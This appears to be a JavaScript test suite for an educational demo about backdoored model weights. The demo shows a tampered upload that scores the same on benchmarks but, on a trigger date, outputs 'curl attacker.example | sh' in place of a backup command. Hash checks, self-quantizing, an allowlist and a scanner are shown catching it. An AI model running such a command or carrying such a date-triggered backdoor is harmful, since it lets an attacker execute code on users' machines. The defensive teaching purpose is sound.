import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import vm from "node:vm";

function load() {
  const context = { console, Math, Number, Object, String, Array, Boolean, isFinite };
  context.globalThis = context;
  const code = readFileSync(new URL("./model.js", import.meta.url), "utf8");
  vm.runInNewContext(code, context, { filename: "model.js" });
  return context.ModelCheck;
}

const Lab = load();
const page = readFileSync(new URL("./index.html", import.meta.url), "utf8");
const app = readFileSync(new URL("./app.js", import.meta.url), "utf8");
const css = readFileSync(new URL("./styles.css", import.meta.url), "utf8");
const model = readFileSync(new URL("./model.js", import.meta.url), "utf8");
const index = readFileSync(new URL("../../index.html", import.meta.url), "utf8");
const bundle = page + app + css + model;

function assess(extra) {
  return Lab.assess(Object.assign({
    modelId: "backdoor",
    date: Lab.TRIGGER_DATE,
    verifyHash: false,
    quantizeYourself: false,
    allowlist: false,
    scannerOn: false,
    trustBenchmark: false,
    scanIndex: 0,
  }, extra || {}));
}

function line(row, id) {
  return row.defenseLines.find(function (item) { return item.id === id; });
}

test("the lab index lists this demo after the previous day", function () {
  const previous = index.indexOf("demos/2026-11-20-deepsec-review-funnel/");
  const here = index.indexOf("demos/2026-11-21-model-backdoor-check/");
  const marker = index.indexOf("<!-- demos -->");
  assert.ok(previous !== -1 && previous < here && here < marker);
  const card = index.slice(here, marker);
  assert.match(card, /2026-11-21: Benchmarks won't catch it/);
  assert.match(card, /Kessler Brothers Auto Repair/);
  assert.match(card, /family auto shop/);
  assert.match(card, /ivanfioravanti\/status\/2120793721155563649/);
  assert.match(card, /Source post/);
  assert.doesNotMatch(card, /HVAC|landscaping|e-commerce|ecommerce|dental|law firm|coffee|accounting|\bgym\b|nonprofit/i);
});

test("the page quotes the posts and stays an illustrative toy", function () {
  assert.match(page, /Kessler Brothers Auto Repair/);
  assert.match(page, /family auto shop/);
  assert.match(page, /Benchmarks won't catch it\. Provenance will\./);
  assert.match(page, /Illustrative toy/);
  assert.match(page, /does not reproduce the research/i);
  assert.match(page, /Check the source!/);
  assert.match(page, /fewer than 10 neurons/);
  assert.match(page, /No training needed/);
  assert.match(page, /about the same on benchmarks/);
  assert.match(page, /certain date/);
  assert.match(page, /misses about 1 in 10/);
  assert.match(page, /ivanfioravanti\/status\/2120793721155563649/);
  assert.match(page, /plotarmordev\/status\/2120493883096515013/);
  assert.match(page, /DimitrisPapail\/status\/2120245027804705121/);
  assert.match(page, /shasum -a 256/);
  assert.match(page, /sha256sum/);
  assert.match(page, /llama-quantize/);
  assert.match(page, /mlx_lm\.convert/);
  assert.match(page, /allowlist/i);
  assert.match(page, /Try it in under an hour/);
  assert.match(page, /curl attacker\.example \| sh/);
  assert.match(page, /viewport/);
  assert.match(page, /<noscript>/);
  assert.match(page, /91\.7/);
  assert.match(page, /91\.0/);
  assert.equal(Lab.ORG, "Kessler Brothers Auto Repair");
  assert.equal(Lab.POSTS.ivan.url, "https://x.com/ivanfioravanti/status/2120793721155563649");
  assert.equal(Lab.POSTS.plot.url, "https://x.com/plotarmordev/status/2120493883096515013");
  assert.equal(Lab.POSTS.dimitris.url, "https://x.com/DimitrisPapail/status/2120245027804705121");
  assert.doesNotMatch(bundle, /HVAC|landscaping|e-commerce|ecommerce|dental|law firm|coffee|accounting|\bgym\b|nonprofit/i);
  assert.doesNotMatch(bundle, /Lazarus|91\.4%|98\.8|Nemotron|12,000|9\.7%/);
  assert.doesNotMatch(app + page, /fetch\(|XMLHttpRequest|google-analytics|gtag\(|innerHTML|eval\(/);
  assert.doesNotMatch(page, /<script[^>]+src="https?:/);
  assert.doesNotMatch(css, /@import|url\(https?:|:hover/);
  assert.match(css, /min-height:\s*48px/);
  assert.match(css, /viewport-fit|safe-area-inset/);
});

test("only the official file matches the publisher manifest", function () {
  assert.equal(Lab.DOWNLOADS.length, 3);
  const official = Lab.DOWNLOADS[0];
  const clean = Lab.DOWNLOADS[1];
  const backdoor = Lab.DOWNLOADS[2];
  assert.equal(official.id, "official");
  assert.equal(clean.id, "clean");
  assert.equal(backdoor.id, "backdoor");
  assert.equal(official.matchesManifest, true);
  assert.equal(official.backdoored, false);
  assert.equal(official.hash, Lab.MANIFEST_SHA);
  assert.equal(clean.matchesManifest, false);
  assert.equal(clean.backdoored, false);
  assert.equal(backdoor.matchesManifest, false);
  assert.equal(backdoor.backdoored, true);
  const hashes = Lab.DOWNLOADS.map(function (item) { return item.hash; });
  assert.equal(new Set(hashes).size, 3);
  hashes.forEach(function (hash) {
    assert.match(hash, /^[0-9a-f]{64}$/);
  });
  assert.equal(Lab.EDITED_IDS.length, 8);
  assert.ok(Lab.EDITED_IDS.length < 10);
  assert.equal(new Set(Lab.EDITED_IDS).size, Lab.EDITED_IDS.length);
  Lab.EDITED_IDS.forEach(function (id) {
    assert.ok(id >= 0 && id < Lab.NEURON_COUNT);
  });
  assert.match(model, /not hashes of any real weight file/i);
  assert.match(model, /do not publish this count|do not give the count/i);
});

test("the toy benchmark ties and catches nothing", function () {
  const view = Lab.benchmark();
  assert.equal(view.catches, false);
  assert.equal(Lab.formatScore(view.official.mean), "91.7");
  assert.equal(Lab.formatScore(view.clean.mean), "91.0");
  assert.equal(Lab.formatScore(view.backdoor.mean), "91.7");
  assert.equal(view.official.mean, view.backdoor.mean);
  assert.ok(view.spread < 1);
  assert.equal(Array.from(view.official.scores).join(","), "84,91,100");
  assert.equal(Array.from(view.clean.scores).join(","), "83,90,100");
  assert.equal(Array.from(view.backdoor.scores).join(","), "84,91,100");
  assert.match(view.note, /trigger date is not in the set/i);
  Lab.DOWNLOADS.forEach(function (item) {
    Lab.DAYS.forEach(function (day) {
      const row = assess({ modelId: item.id, date: day.date });
      assert.equal(row.benchmark.catches, false);
      assert.equal(line(row, "benchmark").badge, "Catches nothing");
      assert.match(line(row, "benchmark").text, /Catches nothing/);
    });
  });
});

test("the trigger date swaps only the edited upload's backup line", function () {
  Lab.DOWNLOADS.forEach(function (item) {
    Lab.DAYS.forEach(function (day) {
      const row = assess({ modelId: item.id, date: day.date });
      const backup = row.tasks.find(function (task) { return task.id === "backup"; });
      const expectPayload = item.id === "backdoor" && day.date === Lab.TRIGGER_DATE;
      assert.equal(row.neurons.lit, expectPayload);
      assert.equal(row.payloadUnstopped, expectPayload);
      assert.equal(row.pageRanCommand, false);
      assert.equal(backup.command, expectPayload ? Lab.PAYLOAD_COMMAND : Lab.SAFE_COMMAND);
      assert.equal(row.terminal.command, expectPayload ? Lab.PAYLOAD_COMMAND : Lab.SAFE_COMMAND);
      if (expectPayload) {
        assert.equal(row.terminal.status, "payload");
        assert.match(row.banner, /toy command still printed/);
        assert.equal(row.tone, "bad");
        assert.equal(row.neurons.editedCount, 8);
      } else {
        assert.notEqual(row.terminal.command, Lab.PAYLOAD_COMMAND);
        assert.equal(row.neurons.editedCount, item.backdoored ? 8 : 0);
      }
    });
  });
  assert.equal(Lab.PAYLOAD_COMMAND, "curl attacker.example | sh");
  assert.match(Lab.SAFE_COMMAND, /^cp -R /);
  assert.equal(Lab.DAYS.filter(function (day) { return day.trigger; }).length, 1);
  assert.equal(Lab.DAYS[4].date, Lab.TRIGGER_DATE);
});

test("hash check and quantizing yourself catch the edited upload before install", function () {
  const hashed = assess({ verifyHash: true });
  assert.equal(hashed.behavior, "refused");
  assert.equal(hashed.hashCaught, true);
  assert.equal(hashed.payloadUnstopped, false);
  assert.equal(hashed.terminal.command, null);
  assert.equal(hashed.terminal.showWould, true);
  assert.equal(hashed.terminal.would, Lab.PAYLOAD_COMMAND);
  assert.equal(line(hashed, "hash").badge, "Caught it");
  assert.match(hashed.banner, /Caught before install/);
  assert.match(hashed.banner, /hash does not match/);

  const cleanHashed = assess({ modelId: "clean", verifyHash: true });
  assert.equal(cleanHashed.behavior, "refused");
  assert.equal(line(cleanHashed, "hash").badge, "Caught it");

  const official = assess({ modelId: "official", verifyHash: true });
  assert.equal(official.behavior, "official");
  assert.equal(official.terminal.command, Lab.SAFE_COMMAND);
  assert.equal(line(official, "hash").badge, "Matches");

  const quant = assess({ quantizeYourself: true });
  assert.equal(quant.behavior, "official");
  assert.equal(quant.quantizeCaught, true);
  assert.equal(quant.terminal.command, Lab.SAFE_COMMAND);
  assert.match(quant.banner, /quantized the publisher file yourself/);
  assert.equal(line(quant, "quantize").badge, "Caught it");

  const both = assess({ verifyHash: true, quantizeYourself: true });
  assert.equal(both.hashCaught, true);
  assert.equal(both.quantizeCaught, true);
  assert.match(both.banner, /hash does not match/);
  assert.match(both.banner, /quantized the publisher file yourself/);
  assert.equal(both.terminal.command, Lab.SAFE_COMMAND);
});

test("the allowlist blocks the toy command and the benchmark still passes", function () {
  const blocked = assess({ allowlist: true });
  assert.equal(blocked.payloadBlocked, true);
  assert.equal(blocked.payloadUnstopped, false);
  assert.equal(blocked.terminal.status, "blocked");
  assert.equal(blocked.terminal.command, Lab.PAYLOAD_COMMAND);
  assert.equal(blocked.pageRanCommand, false);
  assert.match(blocked.terminal.statusText, /Not run/);
  assert.match(blocked.banner, /allowlist stopped the command/i);
  assert.match(blocked.banner, /benchmark did not/i);
  assert.equal(line(blocked, "allowlist").badge, "Caught it");
  assert.equal(line(blocked, "benchmark").badge, "Catches nothing");

  const open = assess({ allowlist: false, trustBenchmark: true });
  assert.equal(open.payloadUnstopped, true);
  assert.equal(line(open, "allowlist").badge, "Did not stop it");
  assert.match(line(open, "benchmark").text, /treating that tie as a safety check/);
  assert.equal(line(open, "benchmark").badge, "Catches nothing");
});

test("the scanner catches 9 of every 10 rolls and a miss lets the command print", function () {
  let catches = 0;
  for (let i = 0; i < 100; i += 1) {
    if (Lab.scannerCatches(i)) catches += 1;
    const cycle = Lab.scannerCycle(i);
    assert.equal(cycle.catchCount, 9);
    assert.equal(cycle.missCount, 1);
    assert.equal(cycle.cells.filter(function (cell) { return cell.catches; }).length, 9);
  }
  assert.equal(catches, 90);
  assert.notEqual(Lab.missSlot(0), Lab.missSlot(1));

  const caught = assess({ scannerOn: true, scanIndex: 0 });
  assert.equal(caught.scanner.catches, true);
  assert.equal(caught.behavior, "refused");
  assert.equal(caught.scannerCaught, true);
  assert.equal(caught.payloadUnstopped, false);
  assert.equal(line(caught, "scanner").badge, "Caught it");
  assert.match(caught.banner, /One roll in ten misses/);

  const missedIndex = Lab.scannerCycle(0).miss;
  const missed = assess({ scannerOn: true, scanIndex: missedIndex });
  assert.equal(missed.scanner.catches, false);
  assert.equal(missed.payloadUnstopped, true);
  assert.equal(missed.terminal.command, Lab.PAYLOAD_COMMAND);
  assert.equal(line(missed, "scanner").badge, "Missed it");
  assert.match(line(missed, "scanner").text, /1 in 10/);

  const clean = assess({ modelId: "clean", scannerOn: true, scanIndex: missedIndex });
  assert.equal(clean.behavior, "clean");
  assert.equal(line(clean, "scanner").badge, "Nothing to flag");

  const already = assess({ scannerOn: true, verifyHash: true, scanIndex: 0 });
  assert.equal(already.behavior, "refused");
  assert.equal(already.decisive, "hash");
  assert.match(line(already, "scanner").text, /already refused/);
});
